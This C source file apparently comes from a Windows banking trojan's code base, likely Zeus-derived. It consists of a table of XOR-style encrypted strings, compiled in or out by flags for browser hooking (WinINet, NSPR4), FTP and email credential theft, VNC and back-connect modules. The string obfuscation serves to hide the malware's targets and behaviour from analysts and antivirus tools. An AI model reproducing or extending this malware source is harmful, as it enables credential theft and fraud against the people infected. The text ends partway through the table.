#include <windows.h>

#if !defined BO_IS_TESTER
#  include "defines.h"
#endif

#include "cryptedstrings.h"

//?????? ?????.
static const CryptedStrings::STRINGINFO strings[] =
{
/*STRINGS_DATA_BEGIN*/
  {225,  28, "\x92\x83\x91\x87\x80\x8a\x94\x8e\x86\x9c\x98\xb6\xc8\x9f\xb3\xcb\xc1\xc4\x8b\xad\xd0\xc4\xcf\x8e\xd7\x92\x8b\x9d"},
  {224,   7, "\x95\x8f\x89\x8d\x8b\x92\x88"},
  {191,  10, "\xd6\xd3\xdc\xdb\xde\x95\xd3\xc8\xd2\xd1"},
  {123,  45, "\x28\x15\x1f\x0c\x08\x1f\x0f\x19\x2f\x3f\x18\x13\x05\x19\x06\x1b\x0d\x1e\x35\x3f\x06\x00\x09\x03\x14\x11\x3d\x23\x12\x14\x17\x01\x35\x2e\x2f\x3d\x2d\x2d\x34\x33\x3d\x0e\x03\x25\x39"},
  { 75,  59, "\x18\x05\x0f\x1c\x18\x0f\x1f\x09\x1f\x0f\x28\x23\x35\x29\x36\x2b\x3d\x2e\x05\x0f\x36\x30\x39\x33\x24\x21\x71\x1e\x03\x0a\x16\x21\x19\x18\x0c\x06\x1b\x38\x08\x1e\x10\x0b\x0e\x0e\x3b\x36\x17\x0b\x1d\x13\x15\x1d\x33\x17\x0e\x08\x2f\x57\x02"},
  { 70,  16, "\x16\x35\x2b\x23\x2b\x2f\x25\x08\x23\x2e\x2b\x28\x1a\x2a\x3c\x21"},
  {134,  15, "\xf3\xe9\xef\xeb\xed\xf4\xee\xdd\xfb\xe1\xe7\xe3\xe5\xfc\xe6"},
  {206,  76, "\xf4\xab\xc1\xc7\xb8\xaf\xe8\xe6\x95\xe7\xeb\x94\xe2\xe1\xe5\xb2\xfc\xd2\xd6\xaf\xbe\xfb\xf7\x8a\xf6\xf8\x85\xf5\xf0\xf6\xa3\xf3\xe3\xe5\x85\x8b\xca\x8e\x90\x80\x95\x93\xc4\xc7\xc7\x90\xc2\xc1\x99\x90\x88\x92\xda\x9f\xf5\xf3\x9f\x91\xd4\x90\x8a\x9a\x83\x85\xae\xad\xa9\xfe\xa8\xab\xef\xe6\xf2\xe8\xa4\xe1"},
#if(BO_WININET > 0 || BO_NSPR4 > 0)
  {196,  29, "\xa3\xb7\xa7\xa5\xa2\xa4\xa6\x9f\xe9\x9e\x91\xea\xf8\xfb\xbf\x94\xf1\xe5\xe4\xa2\x8f\xf4\xe2\xe1\xa9\xf3\xaa\xa7\xac"},
  {112,  25, "\x37\x03\x13\x11\x16\x10\x12\x57\x1c\x18\x0e\x1a\x5c\x1b\x0c\x10\x0d\x5b\x42\x46\x17\x6f\x6c\x42\x3b"},
  {223,  48, "\xfa\xad\xf8\xaf\xd1\x88\xbc\xbe\xb2\xa4\xb0\xa6\xe9\xf2\xf4\x83\xc5\x9b\xbe\xa9\xb9\xea\xa0\xa6\xb7\xb3\xb1\xfe\xe3\xe7\xb2\xca\xda\x8d\xad\xb3\xa8\xae\xd9\x9c\x96\x82\x94\xce\xf9\xf8\xd4\xa3"},
  {143,   7, "\xa5\xcb\xc0\xdc\xdf\xd3\xa3"},
  { 94,   9, "\x74\x0a\x12\x16\x14\x14\x0f\x17\x7c"},
  { 88,  10, "\x78\x73\x18\x17\x13\x1e\x15\x1a\x14\x7b"},
  {221,  18, "\x9e\xb3\xb1\xaa\xbc\xb6\xaf\xf7\x81\xad\xa7\xb3\xeb\xf0\xf6\xa1\xc0\xc6"},
  {203,  10, "\x91\x89\x80\x8c\xf5\xee\xe8\x9f\xce\xc8"},
  { 50,  33, "\x53\x43\x40\x5d\x5f\x54\x55\x41\x53\x54\x56\x16\x46\x12\x4b\x4a\x55\x0e\x46\x4e\x54\x4a\x09\x50\x58\x47\x4d\x47\x4d\x40\x48\x48\x76"},
  {108,  50, "\x24\x39\x3a\x3f\x48\x08\x1f\x1f\x0c\x00\x08\x13\x09\x02\x03\x17\x15\x12\x10\x45\x58\x0c\x09\x1e\x06\x1b\x17\x1a\x15\x4c\x50\x56\x3f\x6f\x62\x6f\x38\x28\x39\x38\x33\x2a\x34\x23\x7d\x63\x67\x30\x7e\x57"},
  {184,  34, "\xf0\xed\xee\xeb\x9c\xdc\xcb\xcb\xd8\xd4\xdc\xc7\xdd\xd6\xd7\xc3\xc1\xc6\xc4\x8b\x84\xc8\xc0\xcc\xcf\xc5\xc7\xc7\x8d\x9f\x86\x82\xcb\x93"},
#endif
#if(BO_SOCKET_FTP > 0 || BO_SOCKET_POP3 > 0)
  {252,  14, "\xd9\x8e\xc4\xd0\xd7\xdc\x89\xc1\xd1\x86\xb6\xd2\x83\xde"},
  {201,   3, "\xaf\xbc\xbb"},
  { 46,   4, "\x5e\x40\x5c\x1e"},
  { 12,   9, "\x6d\x63\x61\x61\x71\x64\x65\x7e\x77"},
#endif
#if(BO_WININET > 0)
  {  7,  41, "\x54\x69\x63\x70\x74\x63\x73\x65\x53\x43\x64\x6f\x79\x65\x7a\x67\x71\x62\x49\x5d\x7d\x66\x74\x62\x71\x7b\x69\x3c\x5e\x62\x69\x74\x48\x54\x40\x56\x7f\x6f\x40\x49\x41"},
  { 84,  10, "\x07\x21\x37\x25\x24\x71\x02\x32\x3b\x38"},
  { 90,  51, "\x09\x34\x3e\x2d\x29\x3e\x2e\x38\x0e\x1e\x39\x32\x24\x38\x27\x3a\x2c\x3f\x14\x00\x20\x3b\x29\x3f\x2c\x26\x34\x61\x03\x3f\x34\x29\x15\x09\x1d\x0b\x22\x2f\x14\x14\x01\x1b\x19\x1f\x11\x31\x1d\x19\x1e\x0e\x1a"},
  {244,   7, "\xb1\x9b\x97\x95\x9c\x94\x96"},
  {169,   9, "\xec\xc6\xca\xc8\xc1\xc9\xcb\xf8\x99"},
  {189,  44, "\xee\xd3\xd9\xca\xce\xd9\xc9\xdf\xe9\xf9\xde\xd5\xc3\xdf\xc0\xdd\xcb\xd8\xf3\xe7\xc7\xdc\xce\xd8\xcb\xc1\xd3\x86\xe4\xd8\xd3\xce\xf2\xee\xfa\xec\xc5\xc8\xe9\xf3\xe3\xf5\xf4\xef"},
  {242,  12, "\xb1\x9f\x95\x90\x98\xb4\x9b\x9a\x91\x92\x9d\x8a"},
  {224,  68, "\xb3\x8e\x84\x97\x93\x84\x94\x82\xb4\xa4\x83\x88\x9e\x82\x9d\x80\x96\x85\xae\xa4\x9d\x9b\x92\x98\x8f\x8a\xa6\xb8\x89\x8f\x8c\x9a\xae\xb5\x94\xa6\xb6\xb6\xaf\xa8\xa6\x95\x83\xa5\xb8\xa8\xbc\xa1\xb5\xa5\xf2\x80\xb1\xa1\xa2\xbe\xb6\xbe\xa9\x87\x86\xb2\xb0\xba\xd3\xfd\x87\xd6"},
  {124,   4, "\x4d\x49\x4e\x49"},
  {192,   4, "\xf1\xf7\xf2\xfa"},
  {149,  27, "\xd4\xf7\xf4\xf3\xe1\xe4\xbe\xd7\xf3\xff\xf0\xfa\xf0\xf6\xfc\xa0\xa5\xed\xe3\xe3\xef\xf4\xea\xf6\xf4\x81\x85"},
  { 43,   5, "\x7f\x6f\x13\x25\x25"},
  {154,  20, "\xd3\xfd\xb5\xd4\xf1\xfb\xf5\xfb\xfb\xf6\xf4\xbc\xc5\xfe\xfa\xf6\xef\xb1\x85\x83"},
  {221,  10, "\xd7\x8c\xbe\xaa\xb1\xe2\xfb\xff\xa6\xde"},
  {197,   6, "\xe0\xb7\xfa\xe3\xb2\xca"},
  {205,   7, "\xe7\x8c\xe5\xe0\xbd\xb0\xbf"},
  { 34,   3, "\x6e\x4c\x57"},
  {161,  38, "\xf6\xc9\xcd\xcb\xcb\xc1\xd3\x8e\xe0\xc6\xdf\xcf\xdf\xc2\xca\xda\x91\xf5\xcb\xc2\xd9\xdb\xc5\xd3\xcb\x91\x9b\xd9\xd2\xd3\xd4\xd7\xe4\xf3\xb9\x88\xa0\xd7"},
  { 15,   5, "\x4a\x63\x7d\x78\x72"},
#endif
#if(BO_NSPR4 > 0)
  {231,  15, "\xaa\x89\x9f\x8d\x8f\x8e\x80\xbc\xa9\x87\x9f\x89\x8d\x85\x91"},
  {  7,   7, "\x72\x75\x60\x76\x2d\x68\x72"},
  { 86,  12, "\x26\x25\x3b\x33\x3b\x3f\x35\x22\x70\x36\x32\x34"},
  { 40,   9, "\x78\x5b\x45\x4d\x45\x41\x4b\x0a\x55"},
  {210,  10, "\x9b\xa0\x82\xb4\xba\xb6\xa0\xbc\xac\xbe"},
  {216,   4, "\x88\xb8\xae\xb3"},
  {175, 326, "\xda\xdd\xc8\xde\xf4\xda\xdb\xcd\xc1\x8e\x87\xca\xc6\xd6\xd6\xcf\xcd\xd5\x93\xdf\xd4\xd5\xd2\xd1\xd2\x98\xd6\xdb\xdc\xd9\xd8\xd5\xcd\xeb\xe5\xed\xfd\xe3\xe6\xfa\xa5\xaa\xa5\xb4\xaa\xb9\x8c\x8a\xea\xed\xf8\xee\xc4\xea\xeb\xfd\xf1\xbe\xb7\xe4\xe1\xfb\xe7\xf1\x8c\x97\xc3\x8f\x87\x8f\x88\x9a\xa8\x88\xb6\x8c\x96\x96\x85\x8f\x88\x90\xd3\x9f\x94\x95\x92\x91\x92\x85\xd7\xd8\xd3\x94\x90\x9c\xbc\xab\xe4\xf7\xc6\xc0\xbc\xbb\xa2\xb4\x9a\xb4\xb1\xa7\xa7\xe8\xfd\xad\xb8\xbf\xae\xa8\xb0\xac\xae\xf8\xa2\xb5\xa1\xbc\x8e\xa6\x46\x4b\x5a\x45\x45\x4d\x76\x45\x4e\x5e\x40\x40\x01\x0e\x01\x46\x5e\x52\x4e\x59\x12\x01\x34\x32\x42\x45\x50\x46\x6c\x42\x43\x55\x69\x26\x2f\x7f\x6e\x69\x7c\x7a\x6e\x72\x7c\x2a\x74\x63\x73\x6e\x40\x68\x74\x79\x6c\x73\x77\x7f\x48\x7b\x7c\x6c\x76\x76\x3f\x63\x07\x01\x1a\x33\x04\x04\x0a\x0d\x45\x4a\x45\x02\x02\x0e\x12\x05\x56\x45\x70\x76\x0e\x09\x1c\x0a\x28\x06\x07\x11\x15\x5a\x53\x03\x2a\x2d\x38\x3e\x22\x3e\x30\x66\x30\x27\x37\x2a\x1c\x31\x34\x22\x32\x37\x29\x03\x32\x34\x2a\x3d\x34\x23\x27\x31\x71\x7e\x71\x36\xce\xc2\xde\xc9\x82\x91\xa4\xa2\xd2\xd5\xc0\xd6\xfc\xd2\xd3\xc5\xd9\x96\x9f\xcf\xde\xd9\xcc\xca\xde\xc2\xcc\x9a\xc4\xd3\xc3\xde\xd0\xfd\xf8\xee\xe6\xe3\xfd\xd7\xee\xe8\xf6\xe1\xe0\xf7\xf3\xe5\xb1\xed\xf5\xf3\xec\xc5\xf6\xf6\xf4\xf3\xb7\xb8\xb3\xf4\xf0\xfc\x9c\x8b\xc4\xd7\xe6\xe0"},
  { 50,  85, "\x47\x40\x55\x43\x69\x47\x46\x50\x5c\x13\x1a\x5b\x4c\x50\x4b\x4e\x47\x51\x0e\x52\x52\x46\x56\x51\x5f\x5b\x06\x41\x41\x42\x49\x5d\x73\x74\x75\x33\x3a\x37\x36\x30\x69\x39\x31\x22\x13\x15\x69\x6e\x67\x71\x5f\x71\x74\x62\x62\x2d\x28\x69\x7a\x66\x79\x7c\x69\x7f\x5c\x00\x04\x10\x04\x03\x01\x05\x54\x0b\x19\x1e\x1b\x5d\x50\x5d\x53\x4a\x5b\x6c\x6c"},
#endif
  {166,  23, "\xeb\xc6\xc7\xd7\xcd\xce\xc5\xc5\xc7\xce\xf0\xeb\xc6\xca\xdb\xc1\x96\xe7\xd8\xd4\xcb\xd6\xc2"},
  {139,  15, "\xed\xe6\xe8\xfb\xe7\xfe\xe1\xed\xfa\xe7\xf3\xae\xe4\xe7\xe7"},
  {104,   5, "\x42\x47\x19\x04\x00"},
#if(BO_SOFTWARE_EMAIL > 0)
  {214,  20, "\x81\xbe\xba\xb1\xbd\xa4\xa3\xf1\x9f\xbb\xb8\xaf\xbf\xa8\xab\xf9\x84\xa8\xab\xae"},
  { 20,  30, "\x47\x5a\x50\x43\x47\x50\x40\x56\x40\x50\x77\x7c\x6a\x76\x69\x74\x62\x71\x5a\x50\x41\x43\x5e\x47\x40\x41\x5e\x6e\x7c\x61"},
  { 22,   7, "\x41\x56\x56\x5a\x62\x76\x7e"},
  { 78,  16, "\x19\x26\x22\x29\x25\x3c\x3b\x69\x05\x28\x2a\x31\x23\x20\x34\x32"},
  { 13,   6, "\x4c\x34\x3f\x3e\x39\x49"},
  {  9,   3, "\x38\x26\x3b"},
  { 72,  47, "\x0d\x24\x2b\x22\x20\x0c\x2a\x2b\x32\x24\x31\x30\x07\x2a\x2a\x2b\x3d\x3a\x2e\x32\x33\x33\x71\x1a\x3d\x30\x3b\x3f\x15\x31\x32\x25\x0d\x1a\x19\x30\x49\x18\x33\x40\x21\x05\x06\x11\x01\x16\x15"},
  { 64,  23, "\x17\x28\x2c\x27\x2b\x32\x35\x67\x05\x28\x23\x27\x6c\x1f\x2b\x2c\x39\x21\x3b\x36\x3a\x21\x25"},
  {140,  26, "\xc3\xf8\xfa\xe3\xe7\xe6\xe1\xab\xc1\xfd\xf6\xf5\xe5\xf2\xf1\xa3\xce\xf8\xfd\xf6\xe8\xf0\xff\xf5\xe0\xe6"},
  {168,  15, "\xe7\xdc\xde\xc7\xc3\xc2\xc5\x8f\xe5\xd9\xd2\xd1\xc1\xd6\xd5"},
  {143,  20, "\xee\xed\xee\xe3\xfe\xe4\xfd\xf3\xad\xfb\xab\xeb\xe6\xe3\xe2\xe3\xf0\xeb\xf3\xe8"},
  {186,  31, "\xe9\xd4\xde\xcd\xc9\xde\xce\xd8\xee\xfe\xd9\xd2\xc4\xd8\xc7\xda\xcc\xdf\xf4\xfe\xc7\xc1\xc8\xc2\xd5\xd0\x80\xec\xc7\xce\xc8"},
  {223,  36, "\x8c\xb1\xbb\xa8\xac\xbb\xab\xbd\x8b\x9b\xbc\xb7\xa1\xbd\xa2\xbf\xa9\xba\x91\x9b\xa2\xa4\xad\xa7\xb0\xb5\xe5\x88\xaa\xb4\xa4\xe0\xb2\x9f\x94\x90"},
  {234,  10, "\xb9\x9f\x87\x9b\x8b\xcf\xbe\x82\x8d\x97"},
  {232,   4, "\xbb\x88\x86\x9f"},
  {228,   4, "\xd4\x9d\xc3\x94"},
  { 81,  12, "\x06\x39\x3d\x36\x3a\x23\x24\x76\x14\x39\x32\x36"},
  { 35,  17, "\x74\x4b\x4f\x44\x48\x51\x56\x04\x67\x43\x5f\x4d\x0f\x63\x4c\x45\x5f"},
  {158,  14, "\xd3\xfa\xef\xee\xfb\xfc\xfd\xd8\xf5\xf4\xfb\xe0\xfc\xe7"},
  {206,  12, "\x8f\xac\xaf\xa2\xbf\xa5\xbc\x96\x88\xa6\xa9\xa0"},
  {167,  18, "\xf4\xeb\xf1\xf4\xfc\xe7\xcc\xc1\xc6\xc2\xf2\xed\xcf\xce\xdb\xcd\xc4\xc5"},
  { 74,  30, "\x6f\x38\x09\x2a\x2d\x20\x39\x23\x36\x63\x2e\x20\x2b\x22\x7e\x65\x7f\x28\x52\x1c\x73\x32\x3d\x34\x3e\x69\x70\x74\x25\x5d"},
  {173,  49, "\x88\xdf\x95\xa4\xa0\xfb\xce\xd8\xd3\xc1\xd5\x9c\x81\x85\xd0\x98\x98\xc9\x9a\xcd\xb3\xb1\xee\xc9\xd0\xc6\xd9\xd7\xdc\xd5\x89\x92\xa8\xff\x85\x87\xd9\xe9\xf8\xf9\xf2\xeb\xf5\xe2\xbb\xa0\xa6\xf1\x97"},
  {141,   9, "\xa8\xff\xd0\xdd\xec\xfa\xfd\xef\xf7"},
  {212,  12, "\xf1\xa6\x89\x82\xa3\xb4\xa0\x8c\x92\xbc\xb3\xba"},
  { 85,  12, "\x70\x27\x08\x06\x30\x23\x20\x25\x32\x2e\x3b\x6c"},
  {244,   7, "\xd1\x86\xa9\xa7\x9f\x83\x86"},
  { 57,  20, "\x1c\x4b\x64\x69\x58\x5f\x4a\x4c\x54\x6f\x70\x5d\x5b\x5a\x52\x55\x5d\x41\x44\x44"},
  { 23,   4, "\x44\x5b\x41\x44"},
  {126,   4, "\x2e\x30\x2c\x4e"},
  {228,   4, "\xad\xa8\xa7\xb7"},
  {105,   6, "\x49\x40\x38\x39\x21\x45"},
#endif
#if(BO_SOFTWARE_FTP > 0)
  {135,  18, "\xe1\xf2\xf5\xbe\xac\xad\xa4\xf3\xb5\xab\xfe\xcc\xae\xf9\xb3\xad\xe2\x9c"},
  {191,  15, "\xd9\xca\xcd\x86\x94\x95\x9c\xcb\x8d\x93\xc6\xf4\x96\xc1\xbb"},
  { 76,  18, "\x2a\x39\x3e\x75\x67\x66\x6f\x18\x7e\x60\x15\x07\x65\x12\x78\x66\x29\x57"},
  {181,  28, "\xcc\xf5\x84\x80\xcb\xf1\x87\x8a\xd9\xf9\xd7\xd8\xcb\xce\xdc\xd2\xe2\xf6\xc0\x93\x96\xc8\x96\xf7\xc1\xe8\xd9\x9d"},
  {190,   9, "\xcd\xd6\xc8\xd8\xc9\x95\xdc\xd8\xc2"},
  {134,   9, "\xf7\xf2\xed\xe6\xe9\xad\xe4\xe0\xfa"},
  { 91,  11, "\x33\x33\x2a\x2c\x30\x2c\x24\x72\x37\x33\x25"},
  {130,   2, "\xcb\xd3"},
  {205,   4, "\xbd\xa3\xbd\xba"},
  {107,   4, "\x1e\x19\x0c\x1a"},
  { 36,   4, "\x54\x44\x55\x54"},
  {141,  19, "\xde\xc3\xc9\xda\xde\xc9\xd9\xcf\xd9\xc2\xeb\xe7\xf2\xe8\xc5\xda\xcd\xc0\xac"},
  { 15,  10, "\x6b\x6f\x79\x6d\x6d\x65\x65\x6c\x62\x74"},
  {255,  10, "\xd5\x98\x91\x9d\x88\x92\x9f\x80\x87\xdc"},
  { 25,   8, "\x5f\x74\x7a\x69\x75\x5a\x47\x4e"},
  { 74,  11, "\x3d\x28\x30\x16\x28\x3b\x3c\x63\x2b\x2d\x29"},
  {207,  11, "\xac\xa1\xa3\xa2\xae\xa9\xbd\xa1\xa8\xa8\xb6"},
  {185,   7, "\xdd\xdd\xdd\xdb\xc8\xd0\xcb"},
  {177,   4, "\xd9\xdf\xc0\xc6"},
  {132,   8, "\xf1\xf6\xe3\xf5\xee\xe0\xef\xe6"},
  { 21,   8, "\x65\x75\x64\x65\x66\x7f\x61\x76"},
  {245,  32, "\xa6\xbb\xb1\xa2\xa6\xb1\xa1\xb7\xa1\xbb\x97\x97\x8a\x94\x9e\x88\xb9\xb0\x88\x92\x80\x8c\xc3\xa1\x82\x81\x82\x8f\x87\x8c\x8e\x98"},
  { 83,  10, "\x35\x26\x21\x39\x39\x3f\x3b\x35\x36\x3f"},
  {114,  10, "\x1b\x1d\x03\x05\x17\x1b\x18\x11\x13\x09"},
  { 61,  10, "\x17\x48\x50\x4a\x58\x54\x58\x57\x51\x1e"},
  { 22,  17, "\x3c\x63\x7b\x61\x73\x7f\x3a\x72\x71\x72\x71\x7c\x74\x7f\x7d\x6b\x2c"},
  {181,   9, "\x9f\xd3\xdf\xdf\xc2\xdc\xd6\xc0\x97"},
  {207,  15, "\x9b\xa1\xb9\xad\xa7\xea\x8a\xa7\xaa\xab\xa4\xaa\xa7\xa7\xb3"},
  {198,  10, "\xb1\xb4\x9b\xa3\xb6\xb3\xee\xa8\xa0\xa6"},
  { 29,   8, "\x42\x7f\x70\x70\x7f\x71\x7c\x45"},
  {130,   4, "\xca\xcc\xd3\xd5"},
  {140,   4, "\xdc\xc2\xdc\xdb"},
  { 32,   3, "\x75\x68\x66"},
  { 28,   3, "\x4c\x4a\x5a"},
  { 57,  24, "\x6a\x77\x7d\x6e\x6a\x7d\x6d\x7b\x6d\x59\x43\x41\x42\x5d\x43\x55\x41\x74\x5c\x59\x72\x4a\x5b\x5e"},
  {  4,   7, "\x60\x64\x72\x66\x64\x68\x70"},
  { 94,  10, "\x74\x36\x2c\x2e\x2d\x32\x2c\x3a\x3e\x7d"},
  {255,   6, "\xa8\xad\xa2\xba\xaf\xaa"},
  { 97,   5, "\x4b\x4e\x1b\x0f\x09"},
  { 28,  11, "\x33\x37\x31\x35\x37\x4a\x7f\x69\x62\x70\x64"},
  {124,   4, "\x34\x12\x0d\x0b"},
  { 67,   4, "\x13\x2d\x33\x34"},
  { 61,   4, "\x68\x4f\x5a\x4c"},
  {106,   4, "\x3a\x0a\x1b\x1a"},
  {184,  11, "\x92\xdf\xd3\xd7\xd9\xc7\xd7\xd3\xdc\xd0\x98"},
  { 42,   9, "\x6c\x42\x44\x4c\x74\x46\x40\x41\x43"},
  {110,  30, "\x3d\x20\x2a\x39\x3d\x2a\x3a\x2c\x3a\x21\x05\x17\x3e\x33\x0c\x14\x19\x16\x12\x0e\x26\x1d\x0c\x09\x2a\x1f\x1b\x06\x06\x00"},
  {174,  31, "\xfd\xe0\xea\xf9\xfd\xea\xfa\xec\xfa\xe1\xc5\xd7\x90\xff\xf0\xcd\xcb\xd8\xd5\xd3\xc9\xe7\xde\xcd\xc6\xeb\xdc\xda\xc1\xc7\xc3"},
  {191,   8, "\xd7\xd1\xce\xc8\xd5\xdb\xd4\xdd"},
  {217,   8, "\xac\xab\xbe\xa8\xb3\xbd\xb2\xbb"},
  {230,   4, "\x93\x94\x81\x97"},
  { 10,   8, "\x7a\x6a\x7b\x7a\x79\x60\x7e\x69"},
  {  3,  11, "\x45\x43\x53\x20\x6a\x67\x6b\x65\x6c\x6f\x7b"},
  { 13,  41, "\x5e\x43\x49\x5a\x5e\x49\x59\x4f\x59\x69\x66\x74\x75\x69\x6d\x22\x6d\x6e\x76\x75\x6b\x61\x77\x46\x62\x7d\x79\x65\x72\x60\x33\x20\x71\x5f\x4a\x5d\x5a\x41\x44\x44\x56"},
  { 12,   8, "\x64\x62\x7d\x7b\x66\x68\x67\x6e"},
  { 65,  10, "\x31\x2f\x31\x36\x2b\x31\x2a\x24\x2c\x3a"},
  {135,   8, "\xf2\xf5\xe0\xf6\xed\xe3\xec\xe5"},
  { 38,   8, "\x56\x46\x57\x56\x55\x4c\x52\x45"},
  { 94,   6, "\x09\x36\x32\x0e\x19\x0b"},
  {  5,  11, "\x63\x70\x77\x6a\x68\x73\x77\x2c\x79\x74\x7b"},
  {154,   8, "\xa1\xe8\xfd\xeb\xe8\xfa\xee\xa0"},
  {207,   6, "\xf4\xbe\xa2\xbe\xbf\xf7"},
  {109,   6, "\x56\x19\x1c\x0b\x1b\x55"},
  { 97,  10, "\x5a\x10\x02\x11\x16\x13\x08\x14\x0d\x55"},
  {211,  14, "\xb5\xa6\xa1\xfa\xb4\xb9\xb8\xb9\xba\xb4\xbd\xbd\xad\xf4"},
  {215,  13, "\x91\x82\x85\xf4\x90\xbd\xbc\xbd\xbe\xb0\xb9\xb9\xa9"},
  {105,  30, "\x3a\x27\x2d\x3e\x3a\x2d\x3d\x2b\x3d\x06\x17\x12\x12\x05\x15\x03\x25\x1b\x14\x08\x18\x1a\x0b\x0e\x2d\x03\x1a\x06\x10\x07"},
  {111,   4, "\x07\x01\x1e\x18"},
  { 22,   4, "\x66\x78\x66\x61"},
  { 80,   4, "\x25\x22\x37\x21"},
  {204,   2, "\xbc\xba"},
  { 58,   7, "\x79\x54\x4a\x5c\x78\x6b\x6c"},
  {138,   5, "\xa0\xa5\xf0\xe4\xe2"},
  {151,  12, "\xd1\xf7\xe3\xfb\xe1\xfb\xe5\xf5\xd6\xea\xf8\xf1"},
  { 59,   4, "\x73\x55\x4a\x4c"},
  {138,   4, "\xda\xe4\xfa\xfd"},
  { 78,   4, "\x1b\x3c\x29\x3f"},
  {110,   8, "\x3e\x0e\x1f\x1e\x1d\x04\x1a\x0d"},
  {177,  55, "\xe2\xff\xf5\xe6\xe2\xf5\xe5\xf3\xe5\xcb\xd6\xdb\xcf\xc8\xd9\xca\xd1\xfc\xc0\xce\xcc\xc1\xc9\xd2\x89\x9a\x85\x9a\xf1\xdf\xca\xda\xe5\xf9\xfd\xf5\xe6\xc8\xf0\xf3\xf7\xfd\xe9\xfb\xf1\xc0\xf9\xff\xf7\xef\xf1\xeb\xf1\xe1\xf4"},
  {120,  18, "\x08\x1c\x08\x08\x13\x13\x1f\x13\x50\x17\x13\x05\x1b\x07\x1f\x03\x0d\x1a"},
  {239,  44, "\xbc\xa1\xab\xb8\xbc\xab\xbb\xad\xbb\x95\x88\x85\x91\x96\x87\x94\x8f\xa2\x9e\x90\x92\x9f\x97\x8c\xd7\xc4\xdb\xc4\xaf\x81\x94\x84\xbb\xa7\xa3\xab\xb8\x96\xab\xa9\xa4\xad\xb0\xb4"},
  {183,   6, "\xd1\xd9\xd9\xd0\xd6\xc0"},
  { 56,   8, "\x6b\x54\x5b\x49\x48\x7b\x6a\x6f"},
#endif
#if(BO_VNC > 0)
  {164,  12, "\xd1\xd6\xc3\xd5\xc9\xcf\xcb\xd7\x82\xc8\xd6\xca"},
#endif
  {210,   4, "\xa2\xb2\xa3\xa2"},
  { 99,  30, "\x00\x07\x13\x14\x14\x3a\x40\x17\x37\x4f\x1a\x37\x4a\x5e\x5f\x19\x2c\x57\x41\x42\x02\x29\x50\x44\x4f\x0f\x57\x08\x19\x06"},
  { 79,   7, "\x28\x3c\x2c\x2e\x29\x2f\x2d"},
  {230,  11, "\x89\x94\xbb\x96\x8a\x96\x94\x85\x81\x98\x82"},
  {234,   9, "\x85\x98\xb7\x9b\x8b\x8d\x83\x82\x96"},
  {141,  13, "\xef\xe3\xfb\xd1\xfc\xe6\xe2\xe4\xf6\xf0\xe6\xea\xed"},
  { 19,  10, "\x71\x7d\x65\x4f\x62\x66\x71\x75\x6f\x7f"},
#if(BO_BCSERVER_PLATFORMS > 0)
  { 85,  10, "\x37\x3b\x23\x09\x33\x33\x0c\x33\x39\x38"},
  {130,  13, "\xe0\xec\xf4\xde\xe4\xe4\xdb\xf7\xef\xe6\xe7\xff\xeb"},
#endif
  { 71,  22, "\x25\x29\x31\x1b\x2b\x36\x35\x30\x26\x20\x27\x29\x28\x3e\x16\x2c\x3e\x25\x34\x36\x3f\x37"},
  {  3,  21, "\x61\x6d\x75\x5f\x6f\x72\x71\x74\x62\x64\x63\x6d\x6c\x7a\x52\x69\x7d\x73\x73\x7c\x72"},
  {147,  11, "\xf5\xe1\xce\xe0\xf6\xe2\xfd\xcb\xfc\xff\xed"},
  { 56,  13, "\x5e\x4a\x65\x48\x59\x5c\x4c\x5c\x58\x6e\x53\x57\x50"},
  {212,  16, "\xb2\xa6\x89\xa4\xb5\xb0\xa0\xb0\xb4\x82\xac\xba\xb5\xb6\xac\xbe"},
  {174,  12, "\xdb\xdc\xc9\xdf\xf5\xcf\xcd\xda\xd2\xd5\xcb\xdc"},
  {204,  11, "\xb9\xbe\xab\xbd\x97\xa5\xa5\xac\xab\xa3\xa0"},
  {124,  12, "\x09\x0e\x1b\x0d\x27\x1c\x02\x1e\x17\x00\x02\x12"},
#if(BO_WININET > 0 || BO_NSPR4 > 0)
  {125,  16, "\x08\x0f\x1a\x0c\x26\x1b\x14\x15\x1e\x1d\x12\x05\x2e\x17\x16\x06"},
  { 70,  19, "\x33\x34\x21\x37\x1d\x20\x2f\x2e\x25\x26\x29\x3e\x15\x39\x2d\x24\x39\x21\x31"},
#endif
  { 88,  14, "\x2d\x2a\x3f\x29\x03\x3e\x3b\x2d\x24\x22\x0d\x34\x31\x21"},
  { 48,  17, "\x45\x42\x57\x41\x6b\x56\x53\x45\x4c\x4a\x65\x49\x59\x50\x51\x49\x45"},
#if(BO_WININET > 0 || BO_NSPR4 > 0)
  {183,  14, "\xc2\xc5\xd0\xc6\xec\xc7\xc3\xdc\xe0\xdc\xd1\xd3\xd8\xd1"},
  {231,  16, "\x92\x95\x80\x96\xbc\x97\x93\x8c\xb0\x9b\x83\x8e\x87\x85\x8a\x83"},
#endif
#if(BO_WININET > 0 || BO_NSPR4 > 0)
  { 21,  17, "\x60\x67\x72\x64\x4e\x78\x7c\x7f\x78\x6c\x7e\x79\x7c\x47\x68\x7f\x71"},
#endif
#if(BO_SOFTWARE_FTP > 0)
  {248,  19, "\x8d\x8a\x9f\x89\xa3\x9b\x8a\x8f\x93\x9d\x9b\x96\x9a\x81\x85\xa8\x8f\x8c\x9e"},
#endif
#if(BO_SOFTWARE_EMAIL > 0)
  {239,  21, "\x9a\x9d\x88\x9e\xb4\x8f\x84\x89\x8e\x8a\x86\x88\x8a\x87\x8f\x94\x8c\xa1\x9a\x99\x8f"},
#endif
  { 47,  20, "\x5a\x5d\x48\x5e\x74\x4c\x45\x49\x54\x4e\x55\x48\x42\x5b\x44\x52\x60\x59\x58\x48"},
  { 93,  23, "\x28\x2f\x3a\x2c\x06\x3e\x37\x3b\x26\x3c\x27\x3a\x30\x29\x36\x20\x12\x3e\x2a\x23\x26\x3e\x2e"},
  { 24,  18, "\x56\x76\x6e\x3b\x79\x73\x71\x6a\x77\x79\x32\x7e\x71\x78\x79\x65\x71\x27"},
  {127,  24, "\x2c\x1d\x0f\x15\x0b\x0e\x59\x19\x1b\x04\x10\x15\x17\x0b\x51\x15\x17\x0b\x0e\x19\x1f\x0f\x0d\x46"},
  {155,  35, "\xdd\xfb\xf0\xf4\xfa\xfa\xbd\xe8\xfc\xb2\xfd\xff\xf6\xf2\xb5\xf8\xe4\xe9\xe8\xe4\xaf\xed\xe2\xe2\xe5\xeb\xe6\xf5\xf5\xe7\xf1\xed\xd4\xd4\x97"},
